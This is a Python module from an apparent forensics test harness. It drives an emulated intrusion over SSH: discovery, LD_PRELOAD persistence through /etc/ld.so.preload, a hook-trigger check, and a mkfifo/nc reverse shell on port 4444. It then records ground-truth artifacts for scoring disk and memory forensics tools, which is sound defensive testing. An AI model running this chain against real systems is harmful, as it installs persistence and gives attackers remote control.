"""
orchestrator/attacks/scenario_01_ldpreload.py

Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload

Attack narrative
----------------
The attacker gains initial SSH access as an unprivileged user.  They perform
system discovery, compile a malicious shared library that hooks getuid(3),
write it to /etc/ld.so.preload, then trigger the hook by spawning a new
process.  A reverse shell is established from inside that hooked process,
leaving the .so mapped in memory.  Cleanup optionally reverts each ART test.

Steps
-----
1. T1082        -- system info collection -> /tmp/T1082.txt (recorded)
2. T1574.006    -- compile .so + write /etc/ld.so.preload
3. custom       -- spawn process, verify hook active in /proc/<pid>/maps
4. T1059.004    -- mkfifo+nc reverse shell (leaves socket + .so in memory)
5. cleanup only when run_cleanup=True: run each executed ART test's
   cleanup_command (T1082 removes /tmp/T1082.txt; T1574.006 unhooks
   /etc/ld.so.preload via sed). The custom steps (trigger, reverse shell) have
   no ART cleanup. Recorded as a single "cleanup" step.

Forensic artifacts
------------------
Disk:
  /etc/ld.so.preload   written by step 2; unhooked (emptied) by cleanup
  /tmp/T1574006.so     compiled .so; NOT removed by cleanup -- persists
  /tmp/T1082.txt       discovery output; deleted by cleanup (T1070.004 tombstone)

Memory:
  any process spawned after step 2 has /tmp/T1574006.so mapped
  reverse shell process: open TCP socket + /tmp/T1574006.so in maps
  (memory mappings outlive the disk cleanup)

Locators contract
-----------------
Each step that plants an artifact records the planted values under a "locators"
sub-dict with stable keys (e.g. ldpreload -> so_path/preload_path, reverse_shell
-> fifo/port). These are intent (what the attack put there), kept distinct from
the observed facts (so_loaded, trigger_pid, connected, ...) recorded alongside.
The planted values come from the module-level constants below, so artifact specs
can reference a step's locators instead of hardcoding paths and ports.

Ground-truth shape
------------------
The orchestrator pre-builds `ground_truth = {"scenario_id": ..., "steps": []}`
and passes it in. run() appends per-step dicts to ground_truth["steps"]; the
orchestrator persists the dict in a finally clause so partial runs survive a
mid-scenario exception.
"""

from __future__ import annotations
from functools import partial

from typing import Any

from orchestrator.attacks.art_runner import ArtRunner
from orchestrator.attacks.helpers import (
    ArtStep,
    run_art_step,
    run_reverse_shell,
)
from orchestrator.core import console
from orchestrator.core.ssh_client import SSHClient
from orchestrator.evaluation.contracts.models import Observable
from orchestrator.evaluation.scenario.scenario_01 import (
    discovery_observables,
    ldpreload_persistence_observables,
    ldpreload_so_observables,
    ldpreload_triggered_observables,
    reverse_shell_fifo_observables,
    reverse_shell_socket_observables,
)

# --- planted artifact locators (single source of truth) -----------------
# What the attack plants on disk / in memory. Steps surface these under their
# "locators" sub-dict so specs reference them instead of hardcoding values.
SO_PATH = "/tmp/T1574006.so"
PRELOAD_PATH = "/etc/ld.so.preload"
DISCOVERY_OUTPUT = "/tmp/T1082.txt"
RS_FIFO = "/tmp/.rs_fifo"
RS_PORT = 4444

# --- ART step descriptors -----------------------------------------------

_DISCOVERY = ArtStep(
    name="discovery",
    technique="T1082",
    guid="cccb070c-df86-4216-a5bc-9fb60c74e27c",  # List OS Information
)

_LDPRELOAD = ArtStep(
    name="ldpreload",
    technique="T1574.006",
    guid="39cb0e67-dd0d-4b74-a74b-c072db7ae991",  # /etc/ld.so.preload
    has_prereq=True,
)


# --- public entry point -------------------------------------------------


def run(
    ssh: SSHClient,
    runner: ArtRunner,
    host_ip: str,
    internet_on,
    internet_off,
    ground_truth: dict[str, Any],
    *,
    run_cleanup: bool = False,
    gt_builder=None,
) -> None:
    # gt_builder (orchestrator.evaluation.scenario.manifest.GtManifestBuilder) is optional and
    # purely additive: when present, each seeded action is also recorded into the
    # GT-blind pipeline's gt_manifest with the wall-clock time at execution. When
    # absent, behavior is unchanged. The ART-driven atomics keep their fixed
    # output paths (the upstream atomic owns them); only the custom reverse-shell
    # port + fifo are randomized from the seed when a builder is supplied.
    params = gt_builder.params if gt_builder is not None and gt_builder.seed else None
    fifo = f"/tmp/.{params.token()}" if params is not None else RS_FIFO
    port = params.port() if params is not None else RS_PORT

    # Drive the attacker's commands through one interactive login shell so they
    # are typed into ~/.bash_history, the way a real intrusion leaves them. The
    # reverse shell stays on the exec path (no PTY) so its backgrounded job
    # survives the channel closing.
    ssh.open_shell()
    _step = partial(
        run_art_step,
        runner,
        internet_on=internet_on,
        internet_off=internet_off,
        executor=ssh.run_shell,
    )
    steps = ground_truth["steps"]
    # ART tests executed this run, in order. Cleanup reverts each one's
    # cleanup_command (if any); custom steps (trigger, reverse shell) are not
    # ART and have no cleanup.
    art_tests: list[ArtStep] = []

    # Discovery (T1082) writes /tmp/T1082.txt (uname, os-release, uptime), which
    # persists on disk in a no-cleanup run, so the discovery_output spec covers
    # it. Record the step so the evaluator scores it: ground_truth must mirror
    # the spec step names exactly. Best-effort (no raise_on_error): a discovery
    # failure should not abort the attack.
    def _record(**kwargs: Any) -> None:
        if gt_builder is not None:
            gt_builder.record(**kwargs)

    try:
        console.step_header("[1/4] discovery")
        discovery = _step(_DISCOVERY)
        discovery["locators"] = {"output_path": DISCOVERY_OUTPUT}
        steps.append(discovery)
        art_tests.append(_DISCOVERY)
        _record(
            technique="T1082",
            event_class="file_created",
            entity_type="path",
            entity_value=DISCOVERY_OUTPUT,
            expected_sources=["disk_fs"],
            observables=discovery_observables(DISCOVERY_OUTPUT, cleanup=run_cleanup),
        )

        console.step_header("[2/4] LD_PRELOAD infection")
        ldpreload = _step(_LDPRELOAD, raise_on_error=True)
        ldpreload["locators"] = {"so_path": SO_PATH, "preload_path": PRELOAD_PATH}
        steps.append(ldpreload)
        art_tests.append(_LDPRELOAD)
        _record(
            technique="T1574.006",
            event_class="persistence_installed",
            entity_type="path",
            entity_value=PRELOAD_PATH,
            expected_sources=["disk_fs", "disk_logs"],
            observables=ldpreload_persistence_observables(
                PRELOAD_PATH, SO_PATH, cleanup=run_cleanup
            ),
        )
        _record(
            technique="T1574.006",
            event_class="file_created",
            entity_type="path",
            entity_value=SO_PATH,
            expected_sources=["disk_fs", "memory"],
            observables=ldpreload_so_observables(SO_PATH, cleanup=run_cleanup),
        )

        console.step_header("[3/4] LD_PRELOAD hook trigger")
        steps.append(_trigger_hook(ssh))
        _record(
            technique="T1574.006",
            event_class="process_exec",
            entity_type="path",
            entity_value=SO_PATH,
            expected_sources=["memory"],
            observables=ldpreload_triggered_observables(SO_PATH, cleanup=run_cleanup),
        )

        console.step_header("[4/4] reverse shell")
        # keep_open=True leaves the socket ESTABLISHED with nc resident through
        # memory acquisition, so linux.sockstat recovers it (sockscan still backs
        # up the post-mortem CLOSE case when run with keep_open=False).
        run_reverse_shell(ssh, host_ip, steps, port=port, fifo=fifo, keep_open=True)
        _record(
            technique="T1059.004",
            event_class="network_connection",
            entity_type="socket",
            entity_value=f"{host_ip}:{port}",
            expected_sources=["memory"],
            observables=reverse_shell_socket_observables(
                f"{host_ip}:{port}", cleanup=run_cleanup
            ),
        )
        _record(
            technique="T1059.004",
            event_class="file_created",
            entity_type="path",
            entity_value=fifo,
            expected_sources=["disk_fs"],
            observables=reverse_shell_fifo_observables(fifo, cleanup=run_cleanup),
        )

        if run_cleanup:
            console.step_header("cleanup")
            _run_cleanups(runner, art_tests, steps, executor=ssh.run_shell)
            _record(
                technique="T1070.004",
                event_class="file_deleted",
                entity_type="path",
                entity_value=DISCOVERY_OUTPUT,
                expected_sources=["disk_fs"],
                # The deletion itself is observable as a recoverable tombstone
                # (deleted-inode recovery), a different locus than the live file.
                observables=[
                    Observable(
                        operation="deleted_file",
                        source_tool="tsk",
                        entity_type="path",
                        entity_value=DISCOVERY_OUTPUT,
                    )
                ],
            )
        else:
            # No cleanup step recorded: with run_cleanup=False the cleanup-phase
            # specs have nothing to match, so ground_truth carries only the attack
            # steps (discovery, ldpreload, ldpreload_trigger, reverse_shell).
            console.step_header("cleanup (skipped: artifacts preserved)")
    finally:
        # Flush the typed commands to ~/.bash_history even if a step raised, so
        # the partial-run disk image still carries the history artifact.
        ssh.close_shell()


# --- scenario-local helpers ---------------------------------------------


def _run_cleanups(
    runner: ArtRunner,
    art_tests: list[ArtStep],
    steps: list[dict[str, Any]],
    *,
    executor=None,
) -> None:
    # Run each executed ART test's cleanup_command (ArtRunner.run_cleanup no-ops
    # when none is defined) and record the techniques actually reverted as one
    # analytic "cleanup" step the cleanup-phase specs bind to. Technique label is
    # T1070.004 (Indicator Removal: File Deletion): cleanup's net forensic effect
    # here is deleting the discovery output and unhooking the preload config.
    reverted: list[str] = []
    for test in art_tests:
        if runner.run_cleanup(
            test.technique,
            test.guid,
            input_arguments=test.input_arguments or None,
            executor=executor,
        ):
            reverted.append(test.technique)
    steps.append(
        {
            "step": "cleanup",
            "technique": "T1070.004",
            "reverted": reverted,
            "run": True,
        }
    )


def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
    # Typed through the interactive shell (run_shell) so the trigger and the
    # /proc maps check are recorded in ~/.bash_history alongside the rest of the
    # session. printf-framed output carries the pid as the last token.
    cmd = "sh -c 'sleep 300 >/dev/null 2>&1 & echo $!'"
    code, out = ssh.run_shell(cmd, timeout=10)
    # The preloaded .so prints a banner from its constructor, so stdout is the
    # banner followed by the pid: take the last token and require it be numeric.
    tokens = out.split()
    pid = tokens[-1] if tokens and tokens[-1].isdigit() else None
    if pid is None:
        return {
            "step": "ldpreload_trigger",
            "technique": "T1574.006",
            "exit_code": code,
            "trigger_pid": None,
            "so_loaded": False,
            "maps_excerpt": "",
            "error": f"could not parse pid from trigger output: {out.strip()!r}",
        }
    _, maps_out = ssh.run_shell(f"grep T1574006.so /proc/{pid}/maps", timeout=10)
    # run_shell does not capture exit status in vanilla mode, so judge the hook
    # from the grep output: real maps lines naming the .so (the echoed command
    # is stripped by run_shell, so it cannot false-positive here).
    maps_lines = [ln for ln in maps_out.splitlines() if "T1574006.so" in ln]
    loaded = bool(maps_lines)
    return {
        "step": "ldpreload_trigger",
        "technique": "T1574.006",
        "exit_code": code,
        "trigger_pid": pid,
        "so_loaded": loaded,
        "maps_excerpt": "\n".join(maps_lines),
    }
